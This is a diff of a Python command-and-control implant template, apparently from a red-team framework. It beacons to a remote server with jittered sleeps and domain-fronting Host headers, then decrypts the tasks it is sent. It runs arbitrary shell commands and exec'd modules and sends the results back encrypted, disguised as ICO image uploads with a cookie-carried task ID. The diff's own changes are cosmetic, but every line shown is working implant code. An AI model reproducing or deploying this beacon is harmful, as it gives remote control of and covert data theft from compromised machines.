@@ -102,12 +102,12 @@ while(True):
       this_timer = random.randint(timer * (1 - jitter), timer * (1 + jitter))
       time.sleep(this_timer)
       ua='%s'
-      if hh[0]: req=urllib2.Request(server,headers={'Host':str(hh[0]),'User-agent':str(ua)})
-      else: req=urllib2.Request(server,headers={'User-agent':str(ua)})
+      if hh[0]: req=urllib2.Request(server,headers={'Host':hh[0],'User-agent':ua})
+      else: req=urllib2.Request(server,headers={'User-agent':ua})
       res=urllib2.urlopen(req)
       html = res.read().decode("utf-8")
     except Exception as e:
-      print("Error in part 1: %%s" %% e)
+      print("error %%s" %% e)
     if html:
       try:
         returncmd = decrypt(key, html)
@@ -141,8 +141,8 @@ while(True):
               returnval = sai()
             elif cmd[:19] == "startanotherimplant":
               returnval = sai(delfile=True)
-            elif cmd[:10] == "loadmodule":
-              module = cmd.replace("loadmodule","")
+            elif cmd[:10] == "load-module":
+              module = cmd.replace("load-module","")
               exec(module)
               try:
                 import sys
@@ -165,7 +165,7 @@ while(True):
                 else:
                   returnval = "Module loaded"
               except Exception as e:
-                returnval = "Error in source file: %%s" %% e              
+                returnval = "Error with source file: %%s" %% e              
             elif cmd.startswith("linuxprivchecker"):
               args = cmd[len('linuxprivchecker'):].strip()
               args = args.split()
@@ -200,14 +200,14 @@ while(True):
                 returnval = s.getvalue()
 
               except Exception as e:
-                returnval = "Error in source file: %%s" %% e
+                returnval = "Error with source file: %%s" %% e
 
             else:
               try:
                 returnval = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
               except subprocess.CalledProcessError as exc:
                 returnval = "ErrorCmd: %%s" %% exc.output
-            server = "%%s/%%s%%s" %% (str(serverclean[0]), random.choice(urls), uri)
+            server = "%%s/%%s%%s" %% (serverclean[0], random.choice(urls), uri)
             postcookie = encrypt(key, taskId).decode("utf-8")
             data = base64.b64decode(random.choice(icoimage))
 
@@ -217,12 +217,12 @@ while(True):
                 dataimage = data.ljust(1500, bytes('\x00', "utf-8"))
             enc=encrypt(key, returnval, gzipfile=True)
             dataimagebytes = dataimage+enc
-            if hh[0]: req=urllib2.Request(server,dataimagebytes,headers={'Host':str(hh[0]),'User-agent':str(ua),'Cookie':"SessionID=%%s" %% postcookie})
-            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':str(ua),'Cookie':"SessionID=%%s" %% postcookie})
+            if hh[0]: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh[0],'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
             
             res=urllib2.urlopen(req)
             response = res.read()
 
       except Exception as e:
-        print("Error in part 2: %%s" %% e)
+        print(e)
         pass
